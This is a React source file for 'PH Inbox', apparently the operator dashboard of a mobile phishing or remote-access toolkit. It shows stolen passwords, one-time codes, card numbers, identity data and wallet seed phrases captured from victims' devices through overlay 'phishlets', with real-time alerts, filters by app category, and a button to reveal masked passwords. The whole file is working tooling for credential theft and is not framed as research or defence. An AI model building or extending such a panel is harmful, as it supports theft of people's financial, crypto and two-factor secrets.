import { useState, useCallback, useEffect, useRef } from 'react';
import type { ReactNode } from 'react';
import { useNavigate } from 'react-router-dom';
import { phishInboxApi } from '@/services/api';
import { useAuthStore } from '@/store/auth';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Input } from '@/components/ui/input';
import { Tabs, TabsList, TabsTrigger } from '@/components/ui/tabs';
import {
  MailWarning, Star, Trash2, CheckCheck, Search, RefreshCw,
  Lock, KeyRound, CreditCard, Fingerprint, ShieldAlert,
  MessageSquare, Bitcoin, Landmark, Mail, ShoppingBag, HelpCircle,
  Eye, EyeOff, Clock, Smartphone, ChevronRight,
} from 'lucide-react';

interface InboxItem {
  id: number;
  clientId: string;
  packageName: string;
  appName: string;
  appCategory: string;
  captureType: string;
  fieldName: string;
  fieldValue: string;
  fieldType: string;
  formData: string | null;
  confidence: number;
  isPassword: boolean;
  isOtp: boolean;
  isCard: boolean;
  isIdentity: boolean;
  read: boolean;
  starred: boolean;
  createdAt: string;
}

interface Stats {
  total: number;
  passwords: number;
  otps: number;
  cards: number;
  unread: number;
  byCategory: Array<{ category: string; count: number }>;
  byApp: Array<{ app: string; count: number }>;
}

interface CategoryMeta {
  label: string;
  icon: ReactNode;
  color: string;
}

interface CaptureMeta {
  label: string;
  icon: ReactNode;
  color: string;
}

const CATEGORY_META: Record<string, CategoryMeta> = {
  social:  { label: 'Social',  icon: <MessageSquare className="h-3 w-3" />, color: 'bg-blue-500/10 text-blue-400 border-blue-500/20' },
  crypto:  { label: 'Crypto',  icon: <Bitcoin className="h-3 w-3" />, color: 'bg-amber-500/10 text-amber-400 border-amber-500/20' },
  finance: { label: 'Finance', icon: <Landmark className="h-3 w-3" />, color: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' },
  email:   { label: 'Email',   icon: <Mail className="h-3 w-3" />, color: 'bg-red-500/10 text-red-400 border-red-500/20' },
  commerce:{ label: 'Commerce',icon: <ShoppingBag className="h-3 w-3" />, color: 'bg-purple-500/10 text-purple-400 border-purple-500/20' },
  unknown: { label: 'Other',   icon: <HelpCircle className="h-3 w-3" />, color: 'bg-gray-500/10 text-gray-400 border-gray-500/20' },
};

const CAPTURE_META: Record<string, CaptureMeta> = {
  password: { label: 'Password', icon: <Lock className="h-3 w-3" />,       color: 'bg-red-500/10 text-red-400' },
  otp:      { label: 'OTP',      icon: <KeyRound className="h-3 w-3" />,   color: 'bg-orange-500/10 text-orange-400' },
  card:     { label: 'Card',     icon: <CreditCard className="h-3 w-3" />, color: 'bg-yellow-500/10 text-yellow-400' },
  identity: { label: 'Identity', icon: <Fingerprint className="h-3 w-3" />,color: 'bg-cyan-500/10 text-cyan-400' },
  seed:     { label: 'Seed',     icon: <ShieldAlert className="h-3 w-3" />,color: 'bg-purple-500/10 text-purple-400' },
  session:  { label: 'Account',  icon: <Fingerprint className="h-3 w-3" />,color: 'bg-blue-500/10 text-blue-400' },
  personal: { label: 'Personal', icon: <Smartphone className="h-3 w-3" />, color: 'bg-green-500/10 text-green-400' },
  other:    { label: 'Other',    icon: <HelpCircle className="h-3 w-3" />, color: 'bg-gray-500/10 text-gray-400' },
};

function maskValue(value: string, isPassword: boolean): string {
  if (!isPassword) return value;
  if (value.length <= 2) return '••••••';
  return value[0] + '•'.repeat(Math.min(value.length - 2, 10)) + value[value.length - 1];
}

function timeAgo(dateStr: string): string {
  const d = new Date(dateStr);
  const s = Math.floor((Date.now() - d.getTime()) / 1000);
  if (s < 60) return 'just now';
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`;
  return `${Math.floor(s / 86400)}d ago`;
}

export default function PhishInboxPage() {
  const navigate = useNavigate();
  const { hasPermission } = useAuthStore();
  const [items, setItems] = useState<InboxItem[]>([]);
  const [stats, setStats] = useState<Stats | null>(null);
  const [loading, setLoading] = useState(true);
  const [categoryFilter, setCategoryFilter] = useState('all');
  const [typeFilter, setTypeFilter] = useState('all');
  const [readFilter, setReadFilter] = useState<'all' | 'unread' | 'read'>('all');
  const [starredOnly, setStarredOnly] = useState(false);
  const [search, setSearch] = useState('');
  const [expanded, setExpanded] = useState<Set<number>>(new Set());
  const [revealed, setRevealed] = useState<Set<number>>(new Set());
  const [toast, setToast] = useState<string | null>(null);
  const toastTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const socketRef = useRef<{ off: (event: string) => void } | null>(null);

  const showToast = useCallback((msg: string) => {
    setToast(msg);
    if (toastTimer.current) clearTimeout(toastTimer.current);
    toastTimer.current = setTimeout(() => setToast(null), 3000);
  }, []);

  const load = useCallback(async () => {
    try {
      const filters: Record<string, string | boolean> = {};
      if (categoryFilter !== 'all') filters.category = categoryFilter;
      if (typeFilter !== 'all') filters.captureType = typeFilter;
      if (readFilter === 'unread') filters.unread = true;
      if (starredOnly) filters.starred = true;
      if (search) filters.search = search;
      const [listRes, statsRes] = await Promise.all([
        phishInboxApi.list(filters),
        phishInboxApi.stats(),
      ]);
      setItems((listRes.data as { data?: InboxItem[] })?.data || []);
      setStats((statsRes.data as { data?: Stats })?.data || null);
    } catch { 
      showToast('Failed to load inbox'); 
    }
    finally { 
      setLoading(false); 
    }
  }, [categoryFilter, typeFilter, readFilter, starredOnly, search, showToast]);

  useEffect(() => { 
    load(); 
  }, [load]);

  // Real-time: listen for new captures via socket
  useEffect(() => {
    const token = localStorage.getItem('auth-token');
    if (!token) return;
    
    let mounted = true;
    import('@/services/socket').then(({ initAdminSocket }) => {
      if (!mounted) return;
      const s = initAdminSocket();
      socketRef.current = s;
      s.on('phish:inbox_new', (data: { captureType: string; appName: string }) => {
        showToast(`New ${data.captureType} capture: ${data.appName}`);
        load();
      });
    }).catch(() => {});
    
    return () => { 
      mounted = false;
      socketRef.current?.off('phish:inbox_new'); 
    };
  }, [load, showToast]);

  const markRead = async (id: number) => {
    await phishInboxApi.markRead(id);
    setItems(prev => prev.map(i => i.id === id ? { ...i, read: true } : i));
  };

  const markAllRead = async () => {
    await phishInboxApi.markAllRead();
    showToast('All marked as read');
    load();
  };

  const toggleStar = async (id: number) => {
    const res = await phishInboxApi.toggleStar(id);
    const starred = (res.data as { data?: { starred: boolean } })?.data?.starred;
    setItems(prev => prev.map(i => i.id === id ? { ...i, starred: !!starred } : i));
  };

  const deleteItem = async (id: number) => {
    await phishInboxApi.delete(id);
    setItems(prev => prev.filter(i => i.id !== id));
    showToast('Capture deleted');
  };

  const clearAll = async () => {
    if (!confirm('Delete ALL captures? This cannot be undone.')) return;
    await phishInboxApi.clearAll();
    showToast('Inbox cleared');
    load();
  };

  const toggleExpand = (id: number) => {
    setExpanded(prev => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id); else next.add(id);
      return next;
    });
    if (!items.find(i => i.id === id)?.read) markRead(id);
  };

  const toggleReveal = (id: number) => {
    setRevealed(prev => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id); else next.add(id);
      return next;
    });
  };

  const filtered = items;

  return (
    <div className="space-y-6 p-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="h-10 w-10 rounded-xl bg-red-500/10 flex items-center justify-center">
            <MailWarning className="h-5 w-5 text-red-400" />
          </div>
          <div>
            <h1 className="text-2xl font-bold tracking-tight">PH Inbox</h1>
            <p className="text-sm text-muted-foreground">
              Smart phishing capture notifications — every password, OTP, card, and identity captured in real-time.
            </p>
          </div>
          {stats && stats.unread > 0 && (
            <Badge className="bg-red-500/20 text-red-400 border-red-500/30 text-lg px-3 py-1">
              {stats.unread} new
            </Badge>
          )}
        </div>
        <div className="flex gap-2">
          <Button variant="outline" size="sm" onClick={markAllRead} className="gap-2">
            <CheckCheck className="h-4 w-4" /> Mark all read
          </Button>
          <Button variant="outline" size="sm" onClick={load} className="gap-2">
            <RefreshCw className="h-4 w-4" /> Refresh
          </Button>
          <Button variant="destructive" size="sm" onClick={clearAll} className="gap-2">
            <Trash2 className="h-4 w-4" /> Clear all
          </Button>
        </div>
      </div>

      {/* Stats Cards */}
      {stats && (
        <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
          {[
            { label: 'Total Captures', value: stats.total, icon: <MailWarning className="h-4 w-4" />, color: 'text-gray-400' },
            { label: 'Passwords', value: stats.passwords, icon: <Lock className="h-4 w-4" />, color: 'text-red-400' },
            { label: 'OTPs', value: stats.otps, icon: <KeyRound className="h-4 w-4" />, color: 'text-orange-400' },
            { label: 'Cards', value: stats.cards, icon: <CreditCard className="h-4 w-4" />, color: 'text-yellow-400' },
            { label: 'Unread', value: stats.unread, icon: <Eye className="h-4 w-4" />, color: 'text-blue-400' },
          ].map(s => (
            <Card key={s.label} className="bg-card/50">
              <CardContent className="p-4 flex items-center gap-3">
                <div className={s.color}>{s.icon}</div>
                <div>
                  <div className="text-2xl font-bold">{s.value}</div>
                  <div className="text-xs text-muted-foreground">{s.label}</div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      )}

      {/* Filters */}
      <div className="flex flex-wrap items-center gap-3">
        <div className="relative">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
          <Input
            placeholder="Search app, field, value..."
            value={search}
            onChange={e => setSearch(e.target.value)}
            className="pl-9 w-64"
          />
        </div>
        <Tabs value={categoryFilter} onValueChange={(v: string) => setCategoryFilter(v)}>
          <TabsList>
            <TabsTrigger value="all">All</TabsTrigger>
            <TabsTrigger value="social">Social</TabsTrigger>
            <TabsTrigger value="crypto">Crypto</TabsTrigger>
            <TabsTrigger value="finance">Finance</TabsTrigger>
            <TabsTrigger value="email">Email</TabsTrigger>
            <TabsTrigger value="commerce">Commerce</TabsTrigger>
          </TabsList>
        </Tabs>
        <Tabs value={typeFilter} onValueChange={(v: string) => setTypeFilter(v)}>
          <TabsList>
            <TabsTrigger value="all">All types</TabsTrigger>
            <TabsTrigger value="password">Password</TabsTrigger>
            <TabsTrigger value="otp">OTP</TabsTrigger>
            <TabsTrigger value="card">Card</TabsTrigger>
            <TabsTrigger value="identity">Identity</TabsTrigger>
            <TabsTrigger value="seed">Seed</TabsTrigger>
          </TabsList>
        </Tabs>
        <Tabs value={readFilter} onValueChange={(v: string) => setReadFilter(v as 'all' | 'unread' | 'read')}>
          <TabsList>
            <TabsTrigger value="all">All</TabsTrigger>
            <TabsTrigger value="unread">Unread</TabsTrigger>
            <TabsTrigger value="read">Read</TabsTrigger>
          </TabsList>
        </Tabs>
        <Button
          variant={starredOnly ? 'default' : 'outline'}
          size="sm"
          onClick={() => setStarredOnly(!starredOnly)}
          className="gap-2"
        >
          <Star className={`h-4 w-4 ${starredOnly ? 'fill-current' : ''}`} /> Starred
        </Button>
      </div>

      {/* Capture List */}
      <div className="space-y-2">
        {loading && (
          <div className="flex items-center justify-center py-12">
            <RefreshCw className="h-6 w-6 animate-spin text-muted-foreground" />
          </div>
        )}
        {!loading && filtered.length === 0 && (
          <Card className="bg-card/50">
            <CardContent className="py-12 text-center text-muted-foreground">
              <MailWarning className="h-10 w-10 mx-auto mb-3 opacity-40" />
              <p>No captures yet. Arm a trigger from a device's Overlay or Phishlet page.</p>
            </CardContent>
          </Card>
        )}
        {filtered.map(item => {
          const cat = CATEGORY_META[item.appCategory] || CATEGORY_META.unknown;
          const cap = CAPTURE_META[item.captureType] || CAPTURE_META.other;
          const isExpanded = expanded.has(item.id);
          const isRevealed = revealed.has(item.id);
          return (
            <Card
              key={item.id}
              className={`bg-card/50 cursor-pointer transition-colors hover:bg-card/80 ${!item.read ? 'border-l-2 border-l-red-500' : ''}`}
              onClick={() => toggleExpand(item.id)}
            >
              <CardContent className="p-4">
                <div className="flex items-center gap-3">
                  {/* App icon placeholder */}
                  <div className="h-10 w-10 rounded-xl bg-muted flex items-center justify-center shrink-0 overflow-hidden">
                    <img
                      src={`/icons/${item.appName.toLowerCase().replace(/[^a-z0-9]/g, '')}.png`}
                      alt=""
                      className="h-6 w-6 object-contain"
                      onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }}
                    />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="font-semibold text-sm">{item.appName}</span>
                      <Badge variant="outline" className={`text-xs ${cat.color}`}>
                        {cat.icon} {cat.label}
                      </Badge>
                      <Badge variant="outline" className={`text-xs ${cap.color}`}>
                        {cap.icon} {cap.label}
                      </Badge>
                      {item.isPassword && <Badge className="bg-red-500/20 text-red-400 text-xs">Password</Badge>}
                      {item.isOtp && <Badge className="bg-orange-500/20 text-orange-400 text-xs">OTP</Badge>}
                      {item.isCard && <Badge className="bg-yellow-500/20 text-yellow-400 text-xs">Card</Badge>}
                      {item.isIdentity && <Badge className="bg-cyan-500/20 text-cyan-400 text-xs">Identity</Badge>}
                    </div>
                    <div className="flex items-center gap-2 mt-1 text-xs text-muted-foreground">
                      <span className="font-mono">{item.fieldName || 'form'}</span>
                      <span>·</span>
                      <span className="font-mono truncate max-w-[200px]">
                        {maskValue(item.fieldValue, item.isPassword && !isRevealed)}
                      </span>
                      {item.isPassword && (
                        <button onClick={e => { e.stopPropagation(); toggleReveal(item.id); }}>
                          {isRevealed ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                        </button>
                      )}
                    </div>
                  </div>
                  <div className="flex items-center gap-2 shrink-0">
                    <div className="text-right">
                      <div className="flex items-center gap-1 text-xs text-muted-foreground">
                        <Clock className="h-3 w-3" /> {timeAgo(item.createdAt)}
                      </div>
                      <div className="text-xs text-muted-foreground mt-0.5">
                        {item.confidence}% confidence
                      </div>
                    </div>
                    <Button
                      variant="ghost" size="icon" className="h-8 w-8"
                      onClick={e => { e.stopPropagation(); toggleStar(item.id); }}
                    >
                      <Star className={`h-4 w-4 ${item.starred ? 'fill-yellow-400 text-yellow-400' : 'text-muted-foreground'}`} />
                    </Button>
                    <Button
                      variant="ghost" size="icon" className="h-8 w-8"
                      onClick={e => { e.stopPropagation(); deleteItem(item.id); }}
                    >
                      <Trash2 className="h-4 w-4 text-muted-foreground" />
                    </Button>
                    <ChevronRight className={`h-4 w-4 text-muted-foreground transition-transform ${isExpanded ? 'rotate-90' : ''}`} />
                  </div>
                </div>
                {isExpanded && item.formData && (
                  <div className="mt-3 pt-3 border-t border-border">
                    <div className="text-xs font-semibold text-muted-foreground mb-2">Full Form Data</div>
                    <pre className="text-xs bg-muted p-3 rounded-lg overflow-auto max-h-48 font-mono">
                      {JSON.stringify(JSON.parse(item.formData), null, 2)}
                    </pre>
                  </div>
                )}
                {isExpanded && (
                  <div className="mt-2 flex items-center gap-2 text-xs text-muted-foreground">
                    <Smartphone className="h-3 w-3" />
                    <span className="font-mono">{item.packageName}</span>
                    <span>·</span>
                    <span>Device: {item.clientId.slice(0, 8)}...</span>
                    {hasPermission?.('device:view') && (
                      <Button
                        variant="link" size="sm" className="h-auto p-0 text-xs"
                        onClick={e => { e.stopPropagation(); navigate(`/device/${item.clientId}/phishlet`); }}
                      >
                        View device →
                      </Button>
                    )}
                  </div>
                )}
              </CardContent>
            </Card>
          );
        })}
      </div>

      {/* Toast */}
      {toast && (
        <div className="fixed bottom-6 right-6 bg-card border border-border rounded-lg px-4 py-3 shadow-lg text-sm z-50">
          {toast}
        </div>
      )}
    </div>
  );
} 
